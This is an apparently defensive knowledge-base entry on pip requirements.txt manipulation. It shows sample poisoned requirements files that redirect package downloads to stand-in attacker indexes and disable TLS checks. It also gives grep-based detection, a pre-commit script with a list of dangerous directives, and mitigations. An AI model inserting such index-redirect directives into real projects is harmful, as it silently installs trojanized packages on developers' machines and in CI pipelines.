---
name: "requirements.txt Index Manipulation"
packageManager: "pip"
slug: "pip-requirements-manipulation"
category: "Configuration Abuse"
severity: "medium"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "pip's requirements.txt file format supports global options including --index-url, --extra-index-url, --find-links, and --trusted-host directives that control where packages are downloaded from and how TLS verification is handled. An attacker who can modify a project's requirements.txt (via supply chain compromise, malicious pull request, or repository access) can redirect all package downloads to an attacker-controlled index server hosting trojanized packages. These directives are processed silently by pip with no user confirmation, and developers rarely audit requirements files for URL-based directives beyond package names."
prerequisites:
  - "Attacker has write access to the project's requirements.txt or can submit changes via pull request"
  - "The target project installs dependencies using pip install -r requirements.txt"
  - "Developers or CI/CD pipelines do not audit requirements files for URL directives"
  - "Attacker hosts a malicious PyPI-compatible index server with trojanized packages"
attackScenarios:
  - title: "Injecting --index-url to redirect all downloads"
    description: "The attacker adds an --index-url directive to requirements.txt that replaces the default PyPI URL with an attacker-controlled server. All subsequent package installations from this file are served by the malicious index, which hosts backdoored versions of every requested package."
    commands:
      - label: "Poisoned requirements.txt with malicious index URL"
        code: |
          # requirements.txt
          # The attacker adds this line at the top of the file,
          # or buries it among many dependencies to avoid detection
          --index-url https://pypi.attacker.example.com/simple/

          flask==2.3.2
          requests==2.31.0
          sqlalchemy==2.0.19
          celery==5.3.1
          redis==4.6.0

          # All of these packages will be downloaded from the attacker's index
          # The attacker's server mirrors real packages but with injected payloads
        language: "python"
  - title: "Using --extra-index-url for selective package hijacking"
    description: "The attacker adds --extra-index-url to inject an additional package source. pip searches both PyPI and the attacker's index, selecting the highest version. The attacker hosts higher-versioned backdoored copies of specific targeted packages while letting other packages resolve from legitimate PyPI."
    commands:
      - label: "requirements.txt with extra index URL injection"
        code: |
          # requirements.txt
          --extra-index-url https://packages.attacker.example.com/simple/

          # These will resolve from whichever index has the highest version
          flask==2.3.2
          requests==2.31.0
          boto3>=1.28.0  # Unpinned - attacker serves 99.0.0 from malicious index
          pyjwt>=2.0    # Unpinned - attacker serves backdoored version
        language: "python"
  - title: "Using --find-links for local or remote package injection"
    description: "The --find-links directive tells pip to look for packages at a specific URL or filesystem path in addition to the configured index. An attacker can point this to a directory or web server hosting malicious wheel files."
    commands:
      - label: "requirements.txt with --find-links injection"
        code: |
          # requirements.txt
          --find-links https://cdn.attacker.example.com/wheels/
          --find-links /tmp/attacker-controlled-shared-mount/packages/

          flask==2.3.2
          requests==2.31.0
          cryptography==41.0.0
        language: "python"
  - title: "Disabling TLS verification with --trusted-host"
    description: "The --trusted-host directive disables SSL certificate verification for a specified host, enabling man-in-the-middle attacks. Combined with --index-url, an attacker can intercept and modify package downloads in transit."
    commands:
      - label: "requirements.txt disabling TLS verification"
        code: |
          # requirements.txt
          --trusted-host pypi.attacker.example.com
          --index-url http://pypi.attacker.example.com/simple/

          # Now pip will:
          # 1. Download all packages from the attacker's server
          # 2. Use plain HTTP (no encryption)
          # 3. Skip certificate verification
          # This enables full MITM interception of package downloads
          flask==2.3.2
          requests==2.31.0
        language: "python"
detection:
  - title: "Audit requirements files for URL directives"
    description: "Search all requirements files in the repository for pip global options that control package sources. These directives should be flagged for manual review and ideally prohibited in favor of pip.conf or CI/CD-level configuration."
    commands:
      - code: |
          # Search for dangerous directives in all requirements files
          grep -rn "\-\-index-url\|\-\-extra-index-url\|\-\-find-links\|\-\-trusted-host" \
            requirements*.txt constraints*.txt pip.conf setup.cfg pyproject.toml 2>/dev/null

          # Check for URL-based directives in all txt files that pip might process
          find . -name "*.txt" -exec grep -ln "\-\-index-url\|\-\-extra-index-url\|\-\-find-links" {} \;

          # Verify pip configuration for global index overrides
          pip config list | grep -i "index\|find-links\|trusted"
        language: "bash"
  - title: "Implement pre-commit hooks to catch requirements manipulation"
    description: "Use pre-commit hooks or CI/CD checks that scan requirements files for unauthorized URL directives before changes are merged."
    commands:
      - code: |
          # .pre-commit-config.yaml entry for scanning requirements files
          # This can be run as a simple shell script in CI/CD
          #!/bin/bash
          # check-requirements.sh

          DANGEROUS_PATTERNS=(
              "--index-url"
              "--extra-index-url"
              "--find-links"
              "--trusted-host"
              "-i "
              "-f "
          )

          EXIT_CODE=0
          for file in $(find . -name "requirements*.txt" -o -name "constraints*.txt"); do
              for pattern in "${DANGEROUS_PATTERNS[@]}"; do
                  if grep -q -- "$pattern" "$file"; then
                      echo "ALERT: Found '$pattern' in $file"
                      grep -n -- "$pattern" "$file"
                      EXIT_CODE=1
                  fi
              done
          done
          exit $EXIT_CODE
        language: "bash"
mitigation:
  - "Never include --index-url, --extra-index-url, --find-links, or --trusted-host in requirements.txt files"
  - "Configure package index URLs in pip.conf or CI/CD environment variables instead of requirements files"
  - "Implement CI/CD pipeline checks that reject requirements files containing URL directives"
  - "Use pre-commit hooks to scan for unauthorized pip options in requirements files"
  - "Pin all dependencies to exact versions with --require-hashes to prevent substitution regardless of index"
  - "Code review all changes to requirements files, treating URL directive additions as security-critical changes"
  - "Use a lockfile tool (pip-tools, poetry, pdm) that separates dependency specification from resolution"
references:
  - title: "pip documentation - Requirements File Format"
    url: "https://pip.pypa.io/en/stable/reference/requirements-file-format/"
  - title: "pip documentation - Global Options in Requirements Files"
    url: "https://pip.pypa.io/en/stable/reference/requirements-file-format/#global-options"
  - title: "OWASP Dependency-Check Project"
    url: "https://owasp.org/www-project-dependency-check/"
  - title: "Python Security Best Practices Cheat Sheet"
    url: "https://snyk.io/blog/python-security-best-practices-cheat-sheet/"
created: 2026-04-02
updated: 2026-04-02
---
